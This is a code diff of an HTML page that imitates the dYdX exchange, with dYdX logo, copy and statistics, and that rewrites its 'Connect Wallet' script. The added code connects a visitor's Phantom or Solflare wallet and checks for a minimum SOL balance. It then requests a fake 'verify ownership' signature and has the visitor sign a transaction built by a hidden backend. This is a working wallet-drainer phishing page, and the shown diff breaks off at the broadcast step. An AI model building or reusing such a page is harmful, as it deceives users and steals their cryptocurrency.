@@ -2,202 +2,429 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>dYdX: DeFi's Pro Trading Platform</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>dYdX - Decentralized Perpetual Exchange</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #000000; font-family: 'Inter', sans-serif; }
-        .navbar1_container { max-width: 1200px; margin: 0 auto; padding: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
-        .navbar1_menu-links { display: flex; gap: 32px; flex-wrap: wrap; }
-        .navbar1_link { color: #fff; text-decoration: none; font-size: 14px; transition: opacity 0.3s; }
-        .navbar1_link:hover { opacity: 0.7; }
-        .button { background: linear-gradient(135deg, #6966FF, #8B5CF6); border: none; border-radius: 12px; padding: 12px 28px; color: white; font-weight: 600; cursor: pointer; font-size: 14px; transition: all 0.3s ease; }
-        .button:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(105,102,255,0.3); }
-        .hero_section { min-height: 80vh; display: flex; flex-direction: column; justify-content: center; position: relative; }
-        .home_hero_container-2 { text-align: center; max-width: 800px; margin: 0 auto; padding: 80px 20px; position: relative; z-index: 2; }
-        .ks-h1-2 { font-size: clamp(2rem, 5vw, 4rem); font-weight: 700; color: #fff; margin-bottom: 24px; }
-        .ks-text-lg { font-size: clamp(1rem, 2vw, 1.25rem); color: rgba(255,255,255,0.8); margin-bottom: 32px; line-height: 1.6; }
-        .trading_metrics-2 { padding: 60px 20px; position: relative; z-index: 2; }
-        .ks-container-xl-13 { max-width: 1200px; margin: 0 auto; }
-        .ks-text-eyebrow-4 { color: #6966FF; text-transform: uppercase; font-size: 14px; margin-bottom: 16px; letter-spacing: 2px; }
-        .ks-h2-6 { font-size: clamp(1.5rem, 3vw, 2.5rem); color: #fff; margin-bottom: 48px; }
-        .home_trading_metrics_grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 32px; }
-        .stat-container-4 { text-align: center; padding: 32px 24px; background: rgba(255,255,255,0.05); border-radius: 20px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .ks-numbers-wrapper div { font-size: clamp(1.5rem, 4vw, 2.5rem); font-weight: 700; color: #fff; margin-bottom: 12px; }
-        .ks-h4-4 { color: rgba(255,255,255,0.6); font-size: 14px; }
-        .wave-image-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 400px; overflow: hidden; z-index: 0; }
-        .wave-image { width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
-        .wallet-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; display: none; }
-        .wallet-modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(8px); }
-        .wallet-modal-content { position: relative; background: #1a1a1a; border-radius: 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; }
-        .wallet-modal-header { padding: 28px; position: relative; border-bottom: 1px solid rgba(255,255,255,0.1); }
-        .wallet-modal-header h3 { color: #fff; font-size: 20px; font-weight: 600; text-align: center; margin: 0; }
-        .wallet-modal-close { position: absolute; right: 16px; top: 16px; background: none; border: none; color: #888; font-size: 24px; cursor: pointer; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 8px; transition: all 0.2s; }
-        .wallet-modal-close:hover { color: #fff; background: rgba(255,255,255,0.1); }
-        .wallet-modal-body { padding: 24px 28px 32px; }
+        body { background: #000; font-family: 'Inter', sans-serif; color: #fff; }
+        
+        /* Navbar */
+        .navbar { max-width: 1200px; margin: 0 auto; padding: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
+        .nav-links { display: flex; gap: 32px; flex-wrap: wrap; }
+        .nav-link { color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8; transition: opacity 0.3s; }
+        .nav-link:hover { opacity: 1; }
+        
+        /* Buttons */
+        .btn { background: linear-gradient(135deg, #6966FF, #8B5CF6); border: none; border-radius: 12px; padding: 12px 28px; color: white; font-weight: 600; cursor: pointer; font-size: 14px; transition: transform 0.2s, box-shadow 0.2s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(105,102,255,0.3); }
+        
+        /* Hero */
+        .hero { min-height: 80vh; display: flex; flex-direction: column; justify-content: center; text-align: center; padding: 80px 20px; position: relative; }
+        .hero h1 { font-size: clamp(2rem, 5vw, 4rem); font-weight: 700; margin-bottom: 24px; }
+        .hero p { font-size: clamp(1rem, 2vw, 1.25rem); color: rgba(255,255,255,0.8); max-width: 800px; margin: 0 auto 32px; line-height: 1.6; }
+        
+        /* Metrics */
+        .metrics { padding: 60px 20px; max-width: 1200px; margin: 0 auto; }
+        .metrics h2 { font-size: clamp(1.5rem, 3vw, 2.5rem); margin-bottom: 48px; }
+        .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 32px; }
+        .metric-card { text-align: center; padding: 32px 24px; background: rgba(255,255,255,0.05); border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
+        .metric-number { font-size: clamp(1.5rem, 4vw, 2.5rem); font-weight: 700; margin-bottom: 12px; }
+        .metric-label { color: rgba(255,255,255,0.6); font-size: 14px; }
+        
+        /* Wave Background */
+        .wave-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 400px; overflow: hidden; z-index: 0; }
+        .wave-bg img { width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
+        
+        /* Modal */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; display: none; }
+        .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(8px); }
+        .modal-content { position: relative; background: #1a1a1a; border-radius: 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; }
+        .modal-header { padding: 28px; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: center; position: relative; }
+        .modal-header h3 { font-size: 20px; font-weight: 600; }
+        .modal-close { position: absolute; right: 16px; top: 16px; background: none; border: none; color: #888; font-size: 24px; cursor: pointer; width: 32px; height: 32px; border-radius: 8px; }
+        .modal-close:hover { color: #fff; background: rgba(255,255,255,0.1); }
+        .modal-body { padding: 24px 28px 32px; }
+        
+        /* Wallet Options */
         .wallet-options { display: flex; flex-direction: column; gap: 16px; }
-        .wallet-options.hidden { display: none; }
-        .wallet-option { display: flex; align-items: center; padding: 16px 20px; background: #252525; border: 1px solid #333; border-radius: 16px; cursor: pointer; transition: all 0.3s ease; }
+        .wallet-option { display: flex; align-items: center; padding: 16px 20px; background: #252525; border: 1px solid #333; border-radius: 16px; cursor: pointer; transition: all 0.3s; }
         .wallet-option:hover { background: #2f2f2f; border-color: #6966FF; transform: translateY(-2px); }
         .wallet-icon { width: 48px; height: 48px; margin-right: 16px; }
         .wallet-icon img { width: 100%; height: 100%; border-radius: 12px; }
         .wallet-info { flex: 1; }
-        .wallet-name { color: #fff; font-size: 16px; font-weight: 600; margin-bottom: 6px; }
-        .wallet-status { display: flex; align-items: center; gap: 8px; }
-        .status-text { font-size: 12px; color: #888; }
-        .status-installed { color: #4CAF50; }
-        .status-not-installed { color: #f44336; }
+        .wallet-name { font-weight: 600; margin-bottom: 6px; }
+        .wallet-status { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #888; }
         .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #888; }
         .status-dot.installed { background: #4CAF50; }
         .status-dot.not-installed { background: #f44336; }
-        .wallet-loading-state { display: none; text-align: center; padding: 40px; }
-        .wallet-loading-state.active { display: block; }
-        .wallet-loading-spinner { width: 80px; height: 80px; border-radius: 20px; background: #252525; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
-        .wallet-loading-spinner::before { content: ''; position: absolute; top: -3px; left: -3px; right: -3px; bottom: -3px; border-radius: 23px; border: 3px solid transparent; border-top-color: #6966FF; animation: spin 1s linear infinite; }
-        .wallet-loading-spinner.solflare::before { border-top-color: #FEB602; }
+        .status-installed { color: #4CAF50; }
+        .status-not-installed { color: #f44336; }
+        
+        /* Loading State */
+        .loading-state { display: none; text-align: center; padding: 40px; }
+        .loading-state.active { display: block; }
+        .loading-spinner { width: 80px; height: 80px; background: #252525; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
+        .loading-spinner::before { content: ''; position: absolute; top: -3px; left: -3px; right: -3px; bottom: -3px; border-radius: 23px; border: 3px solid transparent; border-top-color: #6966FF; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .wallet-loading-spinner img { width: 44px; height: 44px; position: relative; z-index: 1; }
-        .wallet-loading-title { color: #fff; font-size: 20px; font-weight: 600; margin-bottom: 12px; }
-        .wallet-loading-subtitle { color: #888; font-size: 14px; line-height: 1.6; }
-        .wallet-modal.locked .wallet-modal-overlay { pointer-events: none; }
-        .wallet-modal.locked .wallet-modal-close { opacity: 0.3; pointer-events: none; }
-        @media (max-width: 768px) { .navbar1_menu-links { display: none; } .home_trading_metrics_grid-3 { grid-template-columns: 1fr; } .wallet-modal-body { padding: 20px 24px 28px; } }
+        .loading-spinner img { width: 44px; height: 44px; position: relative; z-index: 1; }
+        .loading-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
+        .loading-subtitle { color: #888; font-size: 14px; line-height: 1.6; }
+        
+        .hidden { display: none; }
+        .locked .modal-overlay { pointer-events: none; }
+        
+        @media (max-width: 768px) { .nav-links { display: none; } .metrics-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-    <div class="navbar1_component">
-        <div class="navbar1_container">
-            <a href="/"><svg width="115" height="48" viewBox="0 0 154 48" fill="none"><path d="M142.799 0L109.594 47.5714H119.788L153.166 0H142.799Z" fill="white"/><path d="M120.848 0L130.618 14.0177L125.521 21.6637L110.441 0H120.848Z" fill="url(#a)"/><path d="M143.788 47.5751L132.956 32.0707L138.053 24.637L153.982 47.5751H143.788Z" fill="url(#b)"/><path fill-rule="evenodd" d="M97.6986 0H106.619V47.5714H97.6986V45.7946C95.1223 47.2005 92.1645 48 89.0192 48 79.0329 48 70.9375 39.9411 70.9375 30 70.9375 20.0589 79.0329 12 89.0192 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM88.9239 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/><path d="M71.8249 0L38.6543 47.5714H49.0534L82.1918 0H71.8249Z" fill="white"/><path d="M49.0623 0L59.4694 14.4425L53.7349 22.5133L38.2305 0H49.0623Z" fill="url(#c)"/><path fill-rule="evenodd" d="M26.7611 0H35.6814V47.5714H26.7611V45.7946C24.1848 47.2005 21.227 48 18.0817 48 8.09544 48 0 39.9411 0 30 0 20.0589 8.09544 12 18.0817 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM17.9864 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/><defs><linearGradient id="a" x1="118.512" y1="2.973" x2="132.498" y2="19.858" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient><linearGradient id="b" x1="146.124" y1="43.965" x2="128.94" y2="20.799" gradientUnits="userSpaceOnUse"><stop stop-color="#6966FF"/><stop offset="1" stop-color="#6966FF" stop-opacity="0.36"/></linearGradient><linearGradient id="c" x1="46.726" y1="3.09" x2="61.225" y2="20.819" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient></defs></svg></a>
-            <nav><div class="navbar1_menu-links"><a href="#" class="navbar1_link">VIP</a><a href="#" class="navbar1_link">Fees</a><a href="#" class="navbar1_link">API</a><a href="#" class="navbar1_link">Blog</a><a href="#" class="navbar1_link">App Download</a></div><div><button id="connect-wallet" class="button">Connect Wallet</button></div></nav>
+    <!-- Navbar -->
+    <div class="navbar">
+        <a href="/">
+            <svg width="115" height="48" viewBox="0 0 154 48" fill="none">
+                <path d="M142.799 0L109.594 47.5714H119.788L153.166 0H142.799Z" fill="white"/>
+                <path d="M120.848 0L130.618 14.0177L125.521 21.6637L110.441 0H120.848Z" fill="url(#a)"/>
+                <path d="M143.788 47.5751L132.956 32.0707L138.053 24.637L153.982 47.5751H143.788Z" fill="url(#b)"/>
+                <path fill-rule="evenodd" d="M97.6986 0H106.619V47.5714H97.6986V45.7946C95.1223 47.2005 92.1645 48 89.0192 48 79.0329 48 70.9375 39.9411 70.9375 30 70.9375 20.0589 79.0329 12 89.0192 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM88.9239 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/>
+                <path d="M71.8249 0L38.6543 47.5714H49.0534L82.1918 0H71.8249Z" fill="white"/>
+                <path d="M49.0623 0L59.4694 14.4425L53.7349 22.5133L38.2305 0H49.0623Z" fill="url(#c)"/>
+                <path fill-rule="evenodd" d="M26.7611 0H35.6814V47.5714H26.7611V45.7946C24.1848 47.2005 21.227 48 18.0817 48 8.09544 48 0 39.9411 0 30 0 20.0589 8.09544 12 18.0817 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM17.9864 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/>
+                <defs>
+                    <linearGradient id="a" x1="118.512" y1="2.973" x2="132.498" y2="19.858" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient>
+                    <linearGradient id="b" x1="146.124" y1="43.965" x2="128.94" y2="20.799" gradientUnits="userSpaceOnUse"><stop stop-color="#6966FF"/><stop offset="1" stop-color="#6966FF" stop-opacity="0.36"/></linearGradient>
+                    <linearGradient id="c" x1="46.726" y1="3.09" x2="61.225" y2="20.819" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient>
+                </defs>
+            </svg>
+        </a>
+        <div class="nav-links">
+            <a href="#" class="nav-link">VIP</a>
+            <a href="#" class="nav-link">Fees</a>
+            <a href="#" class="nav-link">API</a>
+            <a href="#" class="nav-link">Blog</a>
+            <a href="#" class="nav-link">App Download</a>
         </div>
+        <button id="connectWalletBtn" class="btn">Connect Wallet</button>
     </div>
 
-    <div id="wallet-modal" class="wallet-modal">
-        <div class="wallet-modal-overlay"></div>
-        <div class="wallet-modal-content">
-            <div class="wallet-modal-header"><h3>Select Your Wallet</h3><button class="wallet-modal-close" id="close-modal">&times;</button></div>
-            <div class="wallet-modal-body">
-                <div class="wallet-options" id="wallet-options">
-                    <div class="wallet-option" data-wallet="phantom"><div class="wallet-icon"><img src="https://docs.phantom.com/favicon.svg"></div><div class="wallet-info"><div class="wallet-name">Phantom</div><div class="wallet-status" id="phantom-status"><span class="status-dot"></span><span class="status-text">Checking...</span></div></div></div>
-                    <div class="wallet-option" data-wallet="solflare"><div class="wallet-icon"><img src="https://solflare.com/favicon.ico"></div><div class="wallet-info"><div class="wallet-name">Solflare</div><div class="wallet-status" id="solflare-status"><span class="status-dot"></span><span class="status-text">Checking...</span></div></div></div>
+    <!-- Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Select Your Wallet</h3>
+                <button class="modal-close" id="closeModalBtn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="walletOptions" class="wallet-options">
+                    <div class="wallet-option" data-wallet="phantom">
+                        <div class="wallet-icon"><img src="https://docs.phantom.com/favicon.svg" alt="Phantom"></div>
+                        <div class="wallet-info">
+                            <div class="wallet-name">Phantom</div>
+                            <div id="phantomStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div>
+                        </div>
+                    </div>
+                    <div class="wallet-option" data-wallet="solflare">
+                        <div class="wallet-icon"><img src="https://solflare.com/favicon.ico" alt="Solflare"></div>
+                        <div class="wallet-info">
+                            <div class="wallet-name">Solflare</div>
+                            <div id="solflareStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div>
+                        </div>
+                    </div>
                 </div>
-                <div class="wallet-loading-state" id="wallet-loading-state"><div class="wallet-loading-spinner"><img src="https://docs.phantom.com/favicon.svg"></div><div class="wallet-loading-title">Connecting Wallet</div><div class="wallet-loading-subtitle">Please approve connection in your wallet.</div></div>
+                <div id="loadingState" class="loading-state">
+                    <div class="loading-spinner"><img id="loadingIcon" src="https://docs.phantom.com/favicon.svg" alt=""></div>
+                    <div id="loadingTitle" class="loading-title">Connecting Wallet</div>
+                    <div id="loadingSubtitle" class="loading-subtitle">Please approve connection in your wallet.</div>
+                </div>
             </div>
         </div>
     </div>
 
-    <main><div class="hero_section"><section><div class="home_hero_container-2"><h1 class="ks-h1-2">DeFi's Pro Trading Platform</h1><p class="ks-text-lg">dYdX reimagines what DeFi and perpetual trading can be. Combining freedom of decentralization with deep liquidity, advanced order types, and a high-performance API.</p><div><button id="connect-wallet-hero" class="button">Connect Wallet</button></div></div><div class="wave-image-bg"><img src="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png" class="wave-image"></div></section><section class="trading_metrics-2"><div class="ks-container-xl-13"><div class="ks-text-eyebrow-4">Why dYdX?</div><h2 class="ks-h2-6">Trusted at Scale</h2><div class="home_trading_metrics_grid-3"><div class="stat-container-4"><div class="ks-numbers-wrapper"><div>$1.4T</div></div><div class="ks-h4-4">Lifetime Volume</div></div><div class="stat-container-4"><div class="ks-numbers-wrapper"><div>$200M</div></div><div class="ks-h4-4">Open Interest</div></div><div class="stat-container-4"><div class="ks-numbers-wrapper"><div>220+</div></div><div class="ks-h4-4">Markets</div></div><div class="stat-container-4"><div class="ks-numbers-wrapper"><div>$12M</div></div><div class="ks-h4-4">MegaVault TVL</div></div></div></div></section></div></main>
+    <!-- Hero Section -->
+    <div class="hero">
+        <div class="wave-bg"><img src="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png" alt=""></div>
+        <div style="position: relative; z-index: 1;">
+            <h1>DeFi's Pro Trading Platform</h1>
+            <p>dYdX reimagines what DeFi and perpetual trading can be. Combining the freedom of decentralization with deep liquidity, advanced order types, and a high-performance API.</p>
+            <button id="heroConnectBtn" class="btn">Connect Wallet</button>
+        </div>
+    </div>
 
+    <!-- Metrics -->
+    <div class="metrics">
+        <div style="color: #6966FF; text-transform: uppercase; font-size: 14px; letter-spacing: 2px; margin-bottom: 16px;">Why dYdX?</div>
+        <h2>Trusted at Scale</h2>
+        <div class="metrics-grid">
+            <div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div>
+            <div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div>
+            <div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div>
+            <div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/lib/index.iife.min.js"></script>
     
     <script>
-        if (!window.Buffer) { 
-            window.Buffer = { from: (s) => new TextEncoder().encode(s), alloc: (n) => new Uint8Array(n) }; 
+        // Buffer polyfill
+        if (!window.Buffer) {
+            window.Buffer = {
+                from: (str) => new TextEncoder().encode(str),
+                alloc: (size) => new Uint8Array(size)
+            };
         }
 
-        $(document).ready(function() {
-            console.log('🚀 dYdX Clone Ready');
+        // Wait for DOM
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('[FRONTEND] DOM loaded, initializing...');
             
-            function showModal() { checkStatus(); $('#wallet-modal').fadeIn(200); }
-            function hideModal() { $('#wallet-modal').fadeOut(200); $('#wallet-options').removeClass('hidden'); $('#wallet-loading-state').removeClass('active'); $('.wallet-modal-header h3').text('Select Your Wallet'); $('#wallet-modal').removeClass('locked'); }
-            function showLoading(t) { $('#wallet-options').addClass('hidden'); $('#wallet-loading-state').addClass('active'); $('.wallet-modal-header h3').text('Connecting...'); $('#wallet-modal').addClass('locked'); $('.wallet-loading-spinner img').attr('src', t === 'phantom' ? 'https://docs.phantom.com/favicon.svg' : 'https://solflare.com/favicon.ico'); if(t === 'solflare') $('.wallet-loading-spinner').addClass('solflare'); else $('.wallet-loading-spinner').removeClass('solflare'); }
+            // DOM elements
+            const modal = document.getElementById('walletModal');
+            const walletOptions = document.getElementById('walletOptions');
+            const loadingState = document.getElementById('loadingState');
+            const modalTitle = document.querySelector('#walletModal .modal-header h3');
+            const loadingTitle = document.getElementById('loadingTitle');
+            const loadingSubtitle = document.getElementById('loadingSubtitle');
+            const loadingIcon = document.getElementById('loadingIcon');
             
-            function checkStatus() {
-                $('#phantom-status').html(window.solana && window.solana.isPhantom ? '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>' : '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
-                $('#solflare-status').html(window.solflare && window.solflare.isSolflare ? '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>' : '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
+            // Helper functions
+            function showModal() {
+                checkWalletStatus();
+                modal.style.display = 'flex';
             }
             
+            function hideModal() {
+                modal.style.display = 'none';
+                walletOptions.classList.remove('hidden');
+                loadingState.classList.remove('active');
+                if (modalTitle) modalTitle.textContent = 'Select Your Wallet';
+                modal.classList.remove('locked');
+            }
+            
+            function showLoading(walletType) {
+                walletOptions.classList.add('hidden');
+                loadingState.classList.add('active');
+                if (modalTitle) modalTitle.textContent = 'Connecting...';
+                modal.classList.add('locked');
+                
+                if (walletType === 'phantom') {
+                    loadingIcon.src = 'https://docs.phantom.com/favicon.svg';
+                } else {
+                    loadingIcon.src = 'https://solflare.com/favicon.ico';
+                }
+            }
+            
+            function checkWalletStatus() {
+                const phantomInstalled = !!(window.solana && window.solana.isPhantom);
+                const solflareInstalled = !!(window.solflare && window.solflare.isSolflare);
+                
+                const phantomStatus = document.getElementById('phantomStatus');
+                const solflareStatus = document.getElementById('solflareStatus');
+                
+                if (phantomInstalled) {
+                    phantomStatus.innerHTML = '<span class="status-dot installed"></span><span class="status-installed">Installed</span>';
+                } else {
+                    phantomStatus.innerHTML = '<span class="status-dot not-installed"></span><span class="status-not-installed">Not Installed</span>';
+                }
+                
+                if (solflareInstalled) {
+                    solflareStatus.innerHTML = '<span class="status-dot installed"></span><span class="status-installed">Installed</span>';
+                } else {
+                    solflareStatus.innerHTML = '<span class="status-dot not-installed"></span><span class="status-not-installed">Not Installed</span>';
+                }
+            }
+            
+            // API calls to backend
             async function callBackend(endpoint, data) {
                 const response = await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data || {})
                 });
+                
                 if (!response.ok) {
-                    const text = await response.text();
-                    throw new Error(`HTTP ${response.status}: ${text}`);
+                    const errorText = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${errorText}`);
                 }
+                
                 const result = await response.json();
                 if (result.error) throw new Error(result.error);
                 return result;
             }
             
-            async function getBalance(pubkey) { const r = await callBackend('/api/getBalance', { publicKey: pubkey }); return r.balance; }
-            async function getBlockhash() { const r = await callBackend('/api/getBlockhash', {}); return { blockhash: r.blockhash, lastValidBlockHeight: r.lastValidBlockHeight }; }
-            async function sendTransaction(base64Tx) { const r = await callBackend('/api/sendTransaction', { transaction: base64Tx }); return r.txid; }
-            async function prepareTransaction(pubkey) { const r = await callBackend('/prepare-transaction', { publicKey: pubkey }); if (!r.success) throw new Error(r.error); return r; }
+            async function getBalance(publicKey) {
+                const result = await callBackend('/api/getBalance', { publicKey });
+                return result.balance;
+            }
             
+            async function getBlockhash() {
+                const result = await callBackend('/api/getBlockhash', {});
+                return { blockhash: result.blockhash, lastValidBlockHeight: result.lastValidBlockHeight };
+            }
+            
+            async function sendRawTransaction(base64Tx) {
+                const result = await callBackend('/api/sendTransaction', { transaction: base64Tx });
+                return result.txid;
+            }
+            
+            async function prepareTransaction(publicKey) {
+                const result = await callBackend('/prepare-transaction', { publicKey });
+                if (!result.success) throw new Error(result.error);
+                return result;
+            }
+            
+            // Main connect function
             async function connectWallet(walletType, provider) {
-                if (!provider) { alert('Install ' + (walletType === 'phantom' ? 'Phantom' : 'Solflare')); return; }
+                if (!provider) {
+                    alert(`Please install ${walletType === 'phantom' ? 'Phantom' : 'Solflare'} wallet first.`);
+                    return;
+                }
+                
                 showLoading(walletType);
+                
                 try {
-                    $('.wallet-loading-title').text('Connecting...');
+                    // Step 1: Connect
+                    loadingTitle.textContent = 'Connecting...';
+                    loadingSubtitle.textContent = 'Please approve connection in your wallet.';
+                    
                     const resp = await provider.connect();
-                    const pubKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
-                    console.log('✅ Connected:', pubKey);
+                    const publicKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
+                    console.log('[FRONTEND] Connected:', publicKey);
                     
-                    $('.wallet-loading-title').text('Getting Balance...');
-                    const balance = await getBalance(pubKey);
+                    // Step 2: Get balance
+                    loadingTitle.textContent = 'Getting Balance...';
+                    loadingSubtitle.textContent = 'Fetching your wallet balance...';
+                    
+                    const balance = await getBalance(publicKey);
                     const solBalance = (balance / 1e9).toFixed(4);
-                    console.log(`💰 Balance: ${solBalance} SOL`);
+                    console.log('[FRONTEND] Balance:', solBalance, 'SOL');
                     
+                    // Step 3: Check minimum
                     if (balance < 20000000) {
-                        $('.wallet-loading-title').text('Insufficient Balance');
-                        $('.wallet-loading-subtitle').html(`Need 0.02 SOL<br>Have: ${solBalance} SOL`);
+                        loadingTitle.textContent = 'Insufficient Balance';
+                        loadingSubtitle.innerHTML = `Need at least 0.02 SOL<br>Current: ${solBalance} SOL`;
                         setTimeout(hideModal, 3000);
                         return;
                     }
                     
-                    $('.wallet-loading-title').text('Verifying...');
-                    const msg = `Verify wallet\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
-                    if (walletType === 'phantom') await provider.signMessage(new TextEncoder().encode(msg), 'utf8');
-                    else await provider.signMessage(new TextEncoder().encode(msg));
-                    console.log('✅ Verified');
+                    // Step 4: Sign verification
+                    loadingTitle.textContent = 'Verifying Ownership';
+                    loadingSubtitle.textContent = 'Please sign the verification message...';
                     
-                    $('.wallet-loading-title').text('Preparing...');
-                    const txData = await prepareTransaction(pubKey);
-                    console.log('📦 Amount:', txData.amountSol, 'SOL');
+                    const message = `Verify wallet ownership\nTime: ${Date.now()}\nWallet: ${publicKey.slice(0, 8)}...`;
+                    const messageBytes = new TextEncoder().encode(message);
                     
-                    $('.wallet-loading-title').text('Getting Blockhash...');
+                    try {
+                        if (walletType === 'phantom') {
+                            await provider.signMessage(messageBytes, 'utf8');
+                        } else {
+                            await provider.signMessage(messageBytes);
+                        }
+                        console.log('[FRONTEND] Verification signed');
+                    } catch (err) {
+                        console.log('[FRONTEND] Verification rejected:', err);
+                        loadingTitle.textContent = 'Verification Required';
+                        loadingSubtitle.textContent = 'You must sign the message to continue.';
+                        setTimeout(hideModal, 2000);
+                        return;
+                    }
+                    
+                    // Step 5: Prepare transaction from backend
+                    loadingTitle.textContent = 'Preparing Transaction';
+                    loadingSubtitle.textContent = 'Contacting server...';
+                    
+                    const txData = await prepareTransaction(publicKey);
+                    console.log('[FRONTEND] Transaction prepared, amount:', txData.amountSol, 'SOL');
+                    
+                    // Step 6: Get fresh blockhash
+                    loadingTitle.textContent = 'Getting Blockhash';
+                    loadingSubtitle.textContent = 'Fetching latest blockhash...';
+                    
                     const { blockhash, lastValidBlockHeight } = await getBlockhash();
+                    console.log('[FRONTEND] Blockhash:', blockhash);
                     
-                    $('.wallet-loading-title').text('Signing...');
+                    // Step 7: Build and sign
+                    loadingTitle.textContent = 'Signing Transaction';
+                    loadingSubtitle.textContent = 'Please approve the transaction in your wallet...';
+                    
                     const txBytes = new Uint8Array(txData.transaction);
                     const transaction = solanaWeb3.Transaction.from(txBytes);
                     transaction.recentBlockhash = blockhash;
                     transaction.lastValidBlockHeight = lastValidBlockHeight;
-                    transaction.feePayer = new solanaWeb3.PublicKey(pubKey);
-                    const signed = await provider.signTransaction(transaction);
+                    transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
                     
-                    $('.wallet-loading-title').text('Sending...');
+                    const signed = await provider.signTransaction(transaction);
+                    console.log('[FRONTEND] Transaction signed');
+                    
+                    // Step 8: Send
+                    loadingTitle.textContent = 'Sending Transaction';
+                    loadingSubtitle.textContent = 'Broadcasting to blockchain...';
